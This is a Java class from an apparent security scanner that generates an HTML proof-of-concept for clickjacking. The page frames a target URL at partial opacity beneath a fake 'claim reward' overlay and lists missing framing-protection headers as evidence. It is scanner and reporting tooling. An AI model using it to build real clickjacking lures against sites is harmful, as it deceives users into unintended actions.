package gg.effront.anarcry.scanner.web.clickjacking;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.List;

/**
 * Generates a self-contained HTML PoC file for clickjacking vulnerabilities.
 */
public final class ClickjackingPocGenerator {

    private ClickjackingPocGenerator() {
    }

    /**
     * Generates a clickjacking PoC HTML file.
     *
     * @param targetUrl
     *            base URL of the vulnerable target
     * @param vulnerablePages
     *            list of page paths confirmed vulnerable
     * @param outputDir
     *            directory to write the PoC file; falls back to user.dir if null
     * @return absolute path to the generated HTML file
     */
    public static String generate(String targetUrl, List<String> vulnerablePages, Path outputDir) throws IOException {
        Path dir = outputDir != null ? outputDir : Path.of(System.getProperty("user.dir"));
        Files.createDirectories(dir);

        String sanitized = sanitizeDomain(targetUrl);
        String filename = "poc-clickjacking-" + sanitized + ".html";
        Path outFile = dir.resolve(filename);

        String firstPage = vulnerablePages.isEmpty() ? "/" : vulnerablePages.get(0);
        String iframeSrc = resolveUrl(targetUrl, firstPage);

        StringBuilder pageList = new StringBuilder();
        for (String page : vulnerablePages) {
            String fullUrl = resolveUrl(targetUrl, page);
            pageList.append("            <li><a href=\"").append(escapeHtml(fullUrl)).append("\" target=\"_blank\">")
                    .append(escapeHtml(fullUrl)).append("</a></li>\n");
        }

        String html = """
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>PoC - Clickjacking - %DOMAIN%</title>
                    <style>
                        * { margin: 0; padding: 0; box-sizing: border-box; }
                        body { font-family: monospace; background: #1a1a1a; color: #e0e0e0; }
                        .banner {
                            background: #b71c1c; color: #fff; text-align: center;
                            padding: 12px; font-size: 14px; font-weight: bold;
                            letter-spacing: 1px;
                        }
                        .content { display: flex; gap: 16px; padding: 16px; height: calc(100vh - 140px); }
                        .panel { flex: 1; display: flex; flex-direction: column; }
                        .panel-title {
                            background: #333; padding: 8px 12px; font-size: 13px;
                            font-weight: bold; border-bottom: 2px solid #b71c1c;
                        }
                        .attack-frame {
                            flex: 1; position: relative; background: #222;
                            border: 1px solid #444; overflow: hidden;
                        }
                        .attack-frame iframe {
                            position: absolute; top: 0; left: 0; width: 100%%; height: 100%%;
                            border: none; opacity: 0.75;
                        }
                        .overlay {
                            position: absolute; top: 40%%; left: 50%%; transform: translate(-50%%, -50%%);
                            background: rgba(183, 28, 28, 0.85); color: #fff; padding: 20px 32px;
                            border-radius: 6px; font-size: 18px; font-weight: bold;
                            text-align: center; pointer-events: none; z-index: 10;
                        }
                        .plain-frame {
                            flex: 1; background: #222; border: 1px solid #444; overflow: hidden;
                        }
                        .plain-frame iframe {
                            width: 100%%; height: 100%%; border: none;
                        }
                        .evidence-bar {
                            background: #222; border-top: 2px solid #b71c1c;
                            padding: 12px 16px; font-size: 12px;
                        }
                        .evidence-bar h3 { color: #b71c1c; margin-bottom: 8px; font-size: 13px; }
                        .evidence-bar ul { list-style: none; padding-left: 8px; }
                        .evidence-bar li { margin-bottom: 4px; }
                        .evidence-bar li::before { content: "[!] "; color: #b71c1c; }
                        .evidence-bar a { color: #90caf9; text-decoration: none; }
                        .evidence-bar a:hover { text-decoration: underline; }
                        .vuln-list { margin-top: 8px; }
                        .vuln-list h4 { color: #ffab91; margin-bottom: 4px; font-size: 12px; }
                        .vuln-list ul { list-style: disc; padding-left: 24px; }
                        .vuln-list li::before { content: none; }
                    </style>
                </head>
                <body>
                    <div class="banner">
                        SECURITY POC - Clickjacking Vulnerability - AUTHORIZED TESTING ONLY
                    </div>
                    <div class="content">
                        <div class="panel">
                            <div class="panel-title">Attacker View (overlay + target iframe at 75%% opacity)</div>
                            <div class="attack-frame">
                                <div class="overlay">
                                    CLICK HERE TO CLAIM REWARD<br>
                                    <span style="font-size:12px; opacity:0.7;">(attacker-controlled overlay)</span>
                                </div>
                                <iframe src="%IFRAME_SRC%" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
                            </div>
                        </div>
                        <div class="panel">
                            <div class="panel-title">Target View (plain iframe -- no overlay)</div>
                            <div class="plain-frame">
                                <iframe src="%IFRAME_SRC%" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>
                            </div>
                        </div>
                    </div>
                    <div class="evidence-bar">
                        <h3>Evidence</h3>
                        <ul>
                            <li>Target: %TARGET_URL%</li>
                            <li>X-Frame-Options header: ABSENT or misconfigured</li>
                            <li>Content-Security-Policy frame-ancestors directive: ABSENT or misconfigured</li>
                            <li>JavaScript frame-busting: NOT DETECTED</li>
                        </ul>
                        <div class="vuln-list">
                            <h4>Vulnerable pages (%PAGE_COUNT%):</h4>
                            <ul>
                %PAGE_LIST%
                            </ul>
                        </div>
                    </div>
                </body>
                </html>
                """
                .replace("%DOMAIN%", escapeHtml(sanitized)).replace("%IFRAME_SRC%", escapeHtml(iframeSrc))
                .replace("%TARGET_URL%", escapeHtml(targetUrl))
                .replace("%PAGE_COUNT%", String.valueOf(vulnerablePages.size()))
                .replace("%PAGE_LIST%", pageList.toString());

        Files.writeString(outFile, html);
        return outFile.toAbsolutePath().toString();
    }

    /** Sanitize domain for safe filename: dots, colons, slashes become hyphens. */
    static String sanitizeDomain(String url) {
        String domain = url;
        // Strip scheme
        int schemeEnd = domain.indexOf("://");
        if (schemeEnd >= 0) {
            domain = domain.substring(schemeEnd + 3);
        }
        // Strip path
        int pathStart = domain.indexOf('/');
        if (pathStart >= 0) {
            domain = domain.substring(0, pathStart);
        }
        return domain.replaceAll("[^a-zA-Z0-9-]", "-").replaceAll("-+", "-").replaceAll("(^-|-$)", "");
    }

    private static String resolveUrl(String baseUrl, String path) {
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;
        String p = path.startsWith("/") ? path : "/" + path;
        return base + p;
    }

    private static String escapeHtml(String s) {
        return s.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;").replace("\"", "&quot;").replace("'",
                "&#39;");
    }
}
